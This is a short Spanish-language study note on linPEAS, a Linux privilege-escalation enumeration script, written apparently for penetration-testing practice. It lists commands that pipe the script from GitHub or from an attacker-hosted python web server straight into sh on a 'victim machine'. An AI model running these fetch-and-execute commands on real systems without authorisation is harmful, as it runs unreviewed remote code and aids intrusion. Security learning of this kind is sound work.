**Para qué sirve**

Herramienta que te permite hacer escalada de privilegios encontrando vulnerabilidades en Linux/Unix. Forma parte del proyecto PEASS-ng.



**Cuándo la uso**

En la fase de post-explotación, cuando ya tengo acceso a la máquina víctima y quiero buscar formas de escalar privilegios.



**Comandos básicos**

Repositorio:
https://github.com/peass-ng/PEASS-ng.git

Correr la herramienta sin descargarla:
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

Descargar la herramienta:
curl -L -o linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

Montar servidor en el puerto 80 para ejecutar la herramienta en la máquina víctima:
sudo python3 -m http.server 80

También se puede usar:
python -m http.server 9000

El comando de arriba lo ejecuto en el directorio en el que tengo el .sh

En la máquina víctima descargo el script:
wget http://192.168.152.55:9000/linpeas.sh/

O ejecutarlo directamente sin descargarlo:
curl IP/linpeas.sh | sh

IP es la IP con la que hago el túnel (mi IP de VPN y la misma que el comando de arriba)

Una vez descargado:
chmod +x linpeas.sh
./linpeas.sh
